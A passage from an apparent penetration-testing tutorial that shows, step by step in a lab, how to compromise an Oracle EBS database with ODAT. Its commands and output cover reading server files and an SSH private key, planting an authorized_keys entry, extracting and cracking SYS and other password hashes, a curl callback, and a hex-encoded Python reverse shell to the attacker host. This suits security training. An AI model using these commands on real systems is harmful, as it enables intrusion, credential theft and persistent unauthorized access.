Now if we run the `all` module in ODAT, we will have access to a lot more utilities to continue on our database system compromise journey (output is cut a bit for easier viewing):

```bash
python3 odat.py all -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA
[+] Checking if target 192.168.187.135:1521 is well configured for a connection...
[+] According to a test, the TNS listener 192.168.187.135:1521 is well configured. Continue...

[1] (192.168.187.135:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (192.168.187.135:1521): Testing all authenticated modules on ServiceName:EBSDB with the CUSTOM_DBA/CUSTOM_DBA account
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[+] OK
[2.6] DBMSADVISOR library ?
[+] OK
[2.7] DBMSSCHEDULER library ?
[+] OK
[2.8] CTXSYS library ?
[+] OK
[2.9] Hashed Oracle passwords ?
[-] KO
[2.10] Hashed Oracle passwords with a view in ORACLE_OCM?
[+] OK
[+] OK
[2.11] Hashed Oracle passwords from history?
[-] KO
[2.12] DBMS_XSLPROCESSOR library ?
[+] OK
[2.13] External table to read files ?
[+] OK
[2.14] External table to execute system commands ?
[+] OK
[2.16] DBMS_LOB to read files ?
[+] OK
```

>Remember that the `all` run will leave over artifacts. I have talked about this prior, so I won't go over cleaning up again, but you will need to.

Now we have access to plenty of other modules that can allow us to read files, dump oracle password hashes, and execute system commands. Let's talk about this in more detail next.

#### Removing DBA (Cleanup)
Once you are done playing around with elevated privileges, you will want to clean up and revoke the role grant. It is easy to remove the `DBA` role from your account with the following ODAT command:

```bash
python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --revoke-dba-role  
11:03:55 INFO -: CX_Oracle is well configured according to parameters  
11:03:55 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Revoke DBA role from current user (CUSTOM_DBA)  
11:03:55 INFO -: Trying to revoke DBA role from 'CUSTOM_DBA'  
[+] The DBA role has been revoked from CUSTOM_DBA
```

## File Read/Write/Delete
The following modules allow you to either read, write, or delete files, and are extremely useful in privilege escalating usually. All the methods are "blind" so you need to know the full paths of where you are reading/writing.
- [**ctxsys**](https://github.com/quentinhardy/odat/wiki/ctxsys): This module can be used to download a file stored on the database server.
- [**dbmsadvisor**](https://github.com/quentinhardy/odat/wiki/dbmsadvisor): This module can be used to upload a file on the database server.
- [**dbmslob**](https://github.com/quentinhardy/odat/wiki/dbmslob): This module can be used to download files on the database server.
- [**dbmsxslprocessor**](https://github.com/quentinhardy/odat/wiki/dbmsxslprocessor): This module can be used to upload a file on the database server.
- [**externaltable**](https://github.com/quentinhardy/odat/wiki/externaltable): This module can be used to download files or run a script on the database server. (There are requirements to execute a script with this method)
- [**utlfile**](https://github.com/quentinhardy/odat/wiki/utlfile): This module can be used to upload, download, or delete a file from the database server.

### UTL_FILE
Out of the above options, I am going to go over using the `utlfile` module. The `utlfile` permission I see quite often associated with medium level privilege database accounts. This one is quite powerful, as you can upload, download, and delete files. As stated prior, you will need to know the full path of the files you want to download or upload to. I usually start by mapping out the operating system environment which will be Linux based in my examples.

>You can use the following techniques with any of the modules above (provided they can read, or write for some steps), so I am only covering `utlfile` to keep things rolling.

#### General Files
The first file I would recommend grabbing is the `/etc/passwd` file, this will prove that you can use the module, and you can usually figure out which user is running the database. Here is an example of running this:

```bash
python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --getFile /etc/ passwd passwd.txt  
  
[1] (192.168.187.135:1521): Read the passwd file stored in /etc/ on the 192.168.187.135 server  
[+] Data stored in the passwd file sored in /etc/ (copied in passwd.txt locally):  
b'root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin  
:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:  
Nobody:/:/\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npolkitd:x:999:998:User for polkitd:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\np  
ostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nchrony:x:998:996::/var/lib/chrony:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous  
NFS User:/var/sbin/nologin\noracle:x:54321:54321::/home/oracle:/bin/bash\napplmgr:x:54322:54321::/home/applmgr:/bin/bash\n'

cat passwd.txt
root:x:0:0:root:/root:/bin/bash  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
adm:x:3:4:adm:/var/adm:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin  
operator:x:11:0:operator:/root:/sbin/nologin  
games:x:12:100:games:/usr/games:/sbin/nologin  
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin  
nobody:x:99:99:Nobody:/:/  
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin  
dbus:x:81:81:System message bus:/:/sbin/nologin  
polkitd:x:999:998:User for polkitd:/:/sbin/nologin  
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin  
postfix:x:89:89::/var/spool/postfix:/sbin/nologin  
chrony:x:998:996::/var/lib/chrony:/sbin/nologin  
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin  
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin  
nfsnobody:x:65534:65534:Anonymous NFS User:/var/sbin/nologin  
oracle:x:54321:54321::/home/oracle:/bin/bash  
applmgr:x:54322:54321::/home/applmgr:/bin/bash
```

In EBS environments like my current test environment, the `oracle` user is typically the one running the database. This can also be the `grid` user if that user exists. If none of the users look like a smoking gun, you can try them all by fetching for files that will be in their home directories. The power of `utlfile` and others is you are reading the file system as the user running the database, which usually allows you to see some sensitive files such as `.bash_history`, SSH keys for the DB user, and any configuration/data files associated with the database.

Let's try grabbing down the `oracle` user's `.bash_profile` to see if we can confirm we are running as `oracle`:

```bash
python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --getFile /home/oracle .bash_profile profile.txt  
  
[1] (192.168.187.135:1521): Read the .bash_profile file stored in /home/oracle on the 192.168.187.135 server  
[+] Data stored in the .bash_profile file sored in /home/oracle (copied in profile.txt locally):  
b'# .bash_profile\n\n# Get the aliases and functions\nif [ -f ~/.bashrc ]; then\n\t. ~/.bashrc\nfi\n\n# User specific environment and startup programs\n\nPATH=$PATH:$HOME/.local/bin:$HOME/bin\n\nexport PATH\n'
```

This indeed does work, and unless a system administrator really goofed (such as making all user directories and files readable), this is an effective way of figuring out what user you are running as if they have a home directory. Be sure to also search for shell history files, such as `.bash_history`, as a lot of the time system administrators will use the database account for administrative tasks. Credential exposure through this method is almost guaranteed to get you access to other high-privilege database accounts. Even if the history file doesn't have credentials directly in it, it will give you a good idea of what is being run and might unearth some file path locations that aid in further exploitation/escalation.

My next file enumeration step usually consists of fetching the `/etc/oratab` file, which has the database SID and database home path described within it. You can fetch it as follows:

```bash
python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --getFile /etc/ oratab oratab.txt  
  
[1] (192.168.187.135:1521): Read the oratab file stored in /etc/ on the 192.168.187.135 server  
[+] Data stored in the oratab file sored in /etc/ (copied in oratab.txt locally):  
b'#\n\n\n\n# This file is used by ORACLE utilities.  It is created by root.sh\n# and updated by either Database Configuration Assistant while creating\n# a database or ASM Configuration Assistant while creating ASM instance.\n\n# A colon, \':\', is use  
d as the field terminator.  A new line terminates\n# the entry.  Lines beginning with a pound sign, \'#\', are comments.\n#\n# Entries are of the form:\n#   $ORACLE_SID:$ORACLE_HOME:<N|Y>:\n#\n# The first and second fields are the system identifier and  
home\n# directorse respectively.  The third field indicates\n# to the dbstart utility that the database should , "Y", or should not,\n# "N", be brought up at system boot time.\n#\n# Multiple entries with the same $ORACLE_SID are not allowed.\n#\n#\neb  
scdb:/u01/install/APPS/19.0.0:N\nebsdb:/u01/install/APPS/19.0.0:N\n'

cat oratab.txt
# This file is used by ORACLE utilities.  It is created by root.sh  
# and updated by either Database Configuration Assistant while creating  
# a database or ASM Configuration Assistant while creating ASM instance.  
  
# A colon, ':', is used as the field terminator.  A new line terminates  
# the entry.  Lines beginning with a pound sign, '#', are comments.  
#  
# Entries are of the form:  
#   $ORACLE_SID:$ORACLE_HOME:<N|Y>:  
#  
# The first and second fields are the system identifier and home  
# directorse respectively.  The third field indicates  
# to the dbstart utility that the database should , "Y", or should not,  
# "N", be brought up at system boot time.  
#  
# Multiple entries with the same $ORACLE_SID are not allowed.  
#  
#  
ebscdb:/u01/install/APPS/19.0.0:N  
ebsdb:/u01/install/APPS/19.0.0:N
```

So now we have the SIDs of the database, and the home directory file paths which is typically what the `$ORACLE_HOME` environment variable is set to. There are many files that are helpful you could go grab now at this point within the Oracle environment, which I won't showcase fully, but here are some common ones (`$ORACLE_HOME` in this case is `/u01/install/APPS/19.0.0`):
- `$ORACLE_HOME/network/admin/listener.ora`: Definition for database listener
- `$ORACLE_HOME/network/admin/sqlnet.ora`: Definition for CDB which has the location for the `IFILE`.
- `$ORACLE_HOME/network/admin/tnsnames.ora`: Definition for a database, has TNS connection strings and the aliases they map to.
- `$ORACLE_HOME/network/admin/$NAME/sqlnet_ifile.ora`: The ifile has definitions such as what IP addresses can access the database, and potentially much more. The `$NAME` can be derived from the `sqlnet.ora` which contains the full path for this ifile.
- `$ORACLE_HOME/dbs/init<SID>.ora`: The init file which contains parameters, replace `<SID>` with the actual SID.
-  `$ORACLE_HOME/dbs/spfile<SID>.ora`: The server parameter file, replace `<SID>` with the actual SID.

#### Getting SSH Access
This should go without saying, but you probably also want to see if you can grab the SSH key for the database user if it exists. If you can fetch this, and SSH is accessible over the network from your host, then you have pretty much escalated to where command execution would have got you with a much more interactive session:

```bash
python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --getFile /home/oracle/.ssh id_rsa oracle.key  
  
[1] (192.168.187.135:1521): Read the id_rsa file stored in /home/oracle/.ssh on the 192.168.187.135 server  
[+] Data stored in the id_rsa file sored in /home/oracle/.ssh (copied in oracle.key locally):  
b'-----BEGIN RSA PRIVATE KEY-----.....-----END RSA PRIVATE KEY-----\n'

chmod 600 oracle.key
ssh -i oracle.key oracle@192.168.187.135
```

If there is no private SSH key, but there is an `authorized_keys` file (even if there isn't you can attempt to add your own), you can add to it using file upload in `utlfile`.

In my environment, there is not an `authorized_keys` file so I will add my own with my public key inside.

>In a live environment there most likely would be one, so you would want to download it, append to it, and re-upload it going down this method.

```bash
echo 'ssh-rsa AAAA...g3GB tut@burpy' > authorized_keys
python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --putFile /home/oracle/.ssh/ authorized_keys authorized_keys  
  
[1] (192.168.187.135:1521): Put the authorized_keys local file in the /home/oracle/.ssh/ folder like authorized_keys on the 192.168.187.135 server  
[+] The authorized_keys file was created on the /home/oracle/.ssh/ directory on the 192.168.187.135 server like the authorized_keys file

ssh -i ebs.key oracle@192.168.187.135  
Last login: Wed Nov 26 19:05:56 2025  
[oracle@apps ~]$ id  
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Now we have SSH access. At this point you could run SQL using the `SYS` account not needing to know the password, fully compromising the database:

```bash
# Source the environment variables (Usually can be found in the $ORACLE_HOME in a .env file)
[oracle@apps ~]$ . /u01/install/APPS/19.0.0/EBSCDB_apps.env

# Run SQLPLUS as SYS
[oracle@apps ~]$ sqlplus / as sysdba  
  
SQL*Plus: Release 19.0.0.0.0 - Production on Wed Nov 26 21:17:01 2025  
Version 19.18.0.0.0  
  
Copyright (c) 1982, 2022, Oracle.  All rights reserved.  
  
  
Connected to:  
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production  
Version 19.18.0.0.0  
  
SQL> SELECT USER FROM DUAL;  
  
USER  
--------------------------------------------------------------------------------  
SYS
```

You could also likely pivot in the internal environment from here if the database is set up in a multiple-node configuration. That is all I will cover for SSH, since the further actions are all post-exploitation.

>In production environments, especially hardened ones, you won't be able to directly SSH into database nodes if network segmentation is set up correctly. I have not seen this much in my experience, but if available, it is the easiest way in.

#### Password Authentication Files
The above techniques to further escalate through `utlfile` are not all-inclusive, but are sufficient starting points. The last thing I want to highlight is password file authentication, which I have seen enabled in several environments. If you find yourself in an environment that has password file authentication enabled, you will want to search for `orapw` files. These files contain hashes for high-privilege users such as `SYS`.

You can check if password file authentication is enabled with the following SQL query:
```sql
SELECT name, value FROM v$parameter WHERE name = 'remote_login_passwordfile';
```

If the `value` column comes back as either `SHARED` or `EXCLUSIVE` then it is enabled. If you see `NONE`, no password file is used. Following this, you can see if any users have been added to the password file:

```sql
SELECT * FROM v$pwfile_users;
```

If there are no entries, chances are no `orapw` file will actually exist. However, if you do get rows back, especially for high-privilege accounts such as `SYS`, you will want to look for that `orapw` file. The `orapw` files are typically named `orapw<SID>` where `<SID>` is the actual SID and are located under the `$ORACLE_HOME/dbs/` folder.

>**NOTE**: You may not have permission to query these views, so the following commands are worth trying anyway usually. If you strike out, oh well, but maybe you hit gold and get an `orapw` file with the `SYS` hash.

I will quickly showcase how you can grab the `orapw` file, parse the hashes out, and crack them with `hashcat`.

```bash
# Step 1: Download the orapw file. In my environment, we previously identified that the SID is EBSCDB
python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA --getFile /u01/install/APPS/19.0.0/dbs/ orapwEBSCDB pw_file.bin  
  
[1] (192.168.187.135:1521): Read the orapwEBSCDB file stored in /u01/install/APPS/19.0.0/dbs/ on the 192.168.187.135 server  
[+] Data stored in the orapwEBSCDB file sored in /u01/install/APPS/19.0.0/dbs/ (copied in pw_file.bin locally):  
b'\x00\x00\x00\x00\x00\x02\x00\x00\x0c\x00\x00\x00]\\[Z\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\  
x00\x00\x00\x00\x00\x00ORACLE Remote Password'
# ...SNIP...

# Step 2: Parse the hashes out of the file, aim for the weakest hash type first. Later versions only have 11g up.
# Trying to get 10g SYS password hash:
xxd -c16 -g0 -s +0x0483 -l 16 pw_file.bin    
00000483: 45313041384643463543463533464343  E10A8FCF5CF53FCC

# Getting the 11g salt and hash for SYS:
xxd -c30 -g0 -s +0x04ac -l 30 pw_file.bin    
000004ac: 000000000000000000000000000000000000000000000000000000000000  ..............................

# Getting the 12c SYS password hash:
xxd -c80 -g0 -s +0x04CA -l 80 pw_file.bin    
000004ca: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000001f38080165e6e1db5abbaf23d76b5ebb79a09e  ..............................................................8..e...Z..#.k^.y..

# So in our environment file, we can only grab the 10g
# Step 3: Crack the hash
echo 'E10A8FCF5CF53FCC:SYS' > sys.hash
hashcat -m 3100 sys.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
# ...SNIP...
E10A8FCF5CF53FCC:SYS:WELCOME1!                               
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 3100 (Oracle H: Type (Oracle 7+))  
Hash.Target......: E10A8FCF5CF53FCC:SYS  
Time.Started.....: Thu Nov 27 03:07:41 2025 (1 sec)  
Time.Estimated...: Thu Nov 27 03:07:42 2025 (0 secs)
# ...SNIP...
```

Now with the `SYS` credentials in hand, you could try to log in with that account remotely. The offsets above might need to be tweaked depending on your `orapw` file and which accounts are in it. You can use `xxd` to look around and find either the 10g, 11g, or 12c variations. Hashcat can do all of these hash types, the modes are below:
- Oracle 7+: `-m 3100`
- Oracle 11+: `-m 112`
- Oracle 12+: `-m 12300`

>Often times in production environments, these powerful accounts are not allowed to remotely connect. If you are able to remote in as SYSDBA, it is a configuration mistake that can be quite costly and should be pointed out.


## Dumping Database Password Hashes
If your user has access to any of the following modules, they can dump out either all the password hashes or most of them:

```bash
[2.9] Hashed Oracle passwords ?
[-] KO
[2.10] Hashed Oracle passwords with a view in ORACLE_OCM?
[+] OK
[+] OK
[2.11] Hashed Oracle passwords from history?
[-] KO
```

Password hashes for Oracle databases reside in the `sys.user$` table, which is typically only readable by very high privileged accounts such as `SYS` and `SYSTEM`. However, in most cases if you can escalate to the `DBA` role, you will be able to view password via the Oracle OCM view trick. The Oracle OCM option does not fetch you all database password hashes, such as `SYS` or `SYSTEM`. It is still worth doing to see if you can compromise other database accounts with offline password cracking attempts.

Dumping the hashes via any 3 of the methods is very similar and uses the [**passwordstealer**](https://github.com/quentinhardy/odat/wiki/passwordstealer) module in ODAT. Let's see how we can use this for abusing the Oracle OCM view:

```bash
python3 odat.py passwordstealer -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --get-passwords-ocm  
09:31:00 INFO -: CX_Oracle is well configured according to parameters  
09:31:00 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
09:31:00 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Try to get Oracle hashed passwords with an ORACLE_OCM view (CVE-2020-2984)  
09:31:00 INFO -: Trying to get hashes Oracle_OCM view    
09:31:00 INFO -: Get hashed passwords  
[+] Here are Oracle hashed passwords (some accounts can be locked):  
SYS; None; S:                                                            ;T:                                                                                                                                                                   
SYSTEM;                 ; S:                                                            ;T:                                                                                                                                                                   
OUTLN; None; S:00000000000000000000000000000000000000003E7EA1F5DD44FFE0DC80;T:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C22B84348EFB028A1B80C07A64CBEE17  
DIP; None; S:0000000000000000000000000000000000000000CCF2D9BEFB0966E7BA15;T:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007A370180058FC11A3B0F47D99A49DD80  
XDB; None; S:000000000000000000000000000000000000000064C7F48D11E59C374FBD;T:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008C1A37AA73D75C985C6D3768F380C182  
ORACLE_OCM; None; S:00000000000000000000000000000000000000004213FE43A82F8ECF1A24;T:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A2739475D50CBC201A240D9AB5022E64
# ...SNIP...
```

This dumps out the hashes in three (3) different formats, raw, formatted for `john`, and formatted for `hashcat`. The latter of them are formatted as 10g hashes, so we can use `hashcat` with mode `-m 3100`. These are very weak hashes, and you can go pretty wild using rule sets to try to crack as many as you can.

Example of running `hashcat` with the dumped hashes:

```bash
hashcat -m 3100 db_hashes.txt /usr/share/wordlists/rockyou.txt      
hashcat (v6.2.6) starting
# ...SNIP...
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344385  
* Bytes.....: 139921507  
* Keyspace..: 14344385  
  
96FFB201528F5FD8:FA:PASSWORD                                 
BB47045333C7A561:IA:PASSWORD
# ...SNIP...
5AD7E60F9FCA39A1:OKX:PASSWORD                                
34A7408D979E4EFC:IBY:PASSWORD                                
3F05DFD33854D413:EDGE:WELCOME                                
1DC5850EE751ED16:RECON:RECON                                 
764692354085670A:OO_USER:WELCOME                             
F9DA8977092B7B81:TRACESVR:TRACE                              
54F0C83F51B03F49:AD_MONITOR:LIZARD                           
5BEEF0684A63B990:EM_MONITOR:LIZARD                           
3ADE7988A3DA908F:EBS_SYSTEM:MANAGER

Session..........: hashcat  
Status...........: Exhausted  
Hash.Mode........: 3100 (Oracle H: Type (Oracle 7+))  
Hash.Target......: db_hashes.txt  
Time.Started.....: Thu Nov 27 03:33:16 2025 (3 secs)  
Time.Estimated...: Thu Nov 27 03:33:19 2025 (0 secs)  
Kernel.Feature...: Optimized Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:   301.6 MH/s (0.13ms) @ Accel:256 Loops:1 Thr:128 Vec:1  
Recovered........: 172/196 (87.76%) Digests (total), 172/196 (87.76%) Digests (new), 172/196 (87.76%) Salts  
```

## Command Execution
Alright, finally time for the most fun part. As seen from above, you may not even need to use these modules to fully compromise the database. The modules that allow command execution are as follows:
- [**dbmsscheduler**](https://github.com/quentinhardy/odat/wiki/dbmsscheduler): This module can be used to execute system commands on the database server. You can also get a reverse shell built-in to the module.
- [**java**](https://github.com/quentinhardy/odat/wiki/java): This module can be used to execute system commands on the database server. Can get a pseudo shell or reverse shell built-in to the module.
- [**oradbg**](https://github.com/quentinhardy/odat/wiki/oradbg): This module can be used to execute system commands on the database server.

In practice, I have only seen users have access to DBMS Scheduler and the Java libraries. If you have `oradbg` that will work as well, but I would expect few accounts to have this. As such, I will briefly go over the other two.

>For any commands you are sending through these modules, you will need to use full paths as there is no PATH variable set.

### DBMS Scheduler
The `dbmsscheduler` module allows you to abuse the DBMS Scheduler to create a job that contains your system command, and then run the job. However, this module has some constraints to be aware of:
- You cannot get the output of the system command.
- Some special characters cannot be in the arguments to the system command (such as `>`).

>The operating system user that runs the job is typically the `nobody` user. So while it is great to get command execution, we won't have a high-privilege user using this methodology unless we get lucky.

The easiest way to confirm that your command is running is OOB (Out of Band) payloads. Here is an example of a `curl` callback:

```bash
python3 odat.py dbmsscheduler -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --exec '/usr/bin/curl -s http://192.168.187.134/helloworld'  
10:18:40 INFO -: CX_Oracle is well configured according to parameters  
10:18:41 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Execute the `/usr/bin/curl -s http://192.168.187.134/helloworld` on the 192.168.187.135 server  
10:18:41 INFO -: Execute the following command on the remote database system: /usr/bin/curl -s http://192.168.187.134/helloworld  
10:18:41 INFO -: Be Careful: Special chars are not allowed in the command line  
10:18:41 INFO -: Create a job named FLARLSBPEFRDUUJHZHKE  
10:18:41 INFO -: Run the job  
[+] The `/usr/bin/curl -s http://192.168.187.134/helloworld` command was executed on the 192.168.187.135 server  
[+] The Job is running  
10:18:44 INFO -: Trying to remove job FLARLSBPEFRDUUJHZHKE  
10:19:12 INFO -: Job FLARLSBPEFRDUUJHZHKE has been removed

# On our listener:
sudo python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
192.168.187.135 - - [27/Nov/2025 10:18:41] code 404, message File not found  
192.168.187.135 - - [27/Nov/2025 10:18:41] "GET /helloworld HTTP/1.1" 404 -
```

As mentioned prior, this module has a built in `--reverse-shell` flag. We can showcase this as well.

>The default reverse shell payload is highly fingerprinted. This will get caught in any environment that has NGFW running between you and the database or EDR running on the database system.

```bash
python3 odat.py dbmsscheduler -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --reverse-shell 192.168.187.134 4444  
10:23:59 INFO -: CX_Oracle is well configured according to parameters  
10:23:59 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Try to give you a reverse shell from the 192.168.187.135 server  
[+] The python reverse shell tries to connect to 192.168.187.134:4444  
10:23:59 INFO -: Execute the following command on the remote database system: /usr/bin/python -c exec('696d706f7274206f733b206f732e73797374656d28276578656320353c3e2f6465762f7463702f3139322e3136382e3138372e3133342f343434343b202f62696e2f636174203c2635207  
c207768696c652072656164206c696e653b20646f20246c696e6520323e2635203e26353b20646f6e6527293b'.decode('hex'))  
10:23:59 INFO -: Be Careful: Special chars are not allowed in the command line  
10:23:59 INFO -: Create a job named AFCVKICOUAFCLDSXBAEW  
Listening on 0.0.0.0 4444  
10:23:59 INFO -: Run the job  
Connection received on 192.168.187.135 47726  
[+] The Job is running  
10:24:02 INFO -: Trying to remove job AFCVKICOUAFCLDSXBAEW  
10:24:02 INFO -: When job will be completed, the job AFCVKICOUAFCLDSXBAEW will be dropped  
/bin/id  
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:initrc_t:s0  
/bin/ls /  
backup  
bin  
boot  
dev  
etc  
home  
lib  
lib64  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
swapfile  
sys  
tmp  
u01  
usr  
var
```

>The built-in reverse shell payload is for Python 2, and some environments may use Python 3 instead. You would need to change the payload accordingly in those situations.

### Java
The `java` module is the best method of command execution in my opinion, as it will run as the underlying database user on the operating system. There is a caveat to it, which is your need for the ability to grant Java permissions to yourself to use this method. (I.E Have the `JAVA_ADMIN` role or `DBA`)

This module has a built-in pseudo shell, which is stealthier than using a reverse shell. Let's go ahead and test if our `CUSTOM_DBA` user who now possesses the `DBA` role can use this module:

```bash
python3 odat.py java -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUSTOM_DBA -v --exec /usr/bin/whoami  
10:32:01 INFO -: CX_Oracle is well configured according to parameters  
10:32:01 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
  
[1] (192.168.187.135:1521): Execute the `/usr/bin/whoami` on the 192.168.187.135 server  
10:32:01 INFO -: Create and compile the java class  
10:32:01 INFO -: Create a function to call java  
10:32:01 INFO -: Execute the following command system remotly: /usr/bin/whoami  
10:32:01 INFO -: The system command output is: `Exception: the Permission ("java.io.FilePermission" "/bin/sh" "execute") has not been granted to CUS`...  
Exception: the Permission ("java.io.FilePermission" "/bin/sh" "execute") has not been granted to CUSTOM_DBA. The PL/SQL to grant this is dbms_java.grant_permission( 'CUSTOM_DBA', 'SYS:java.io.FilePermission', '/bin/sh', 'execute' )  
10:32:01 INFO -: Delete the PL/SQL function created  
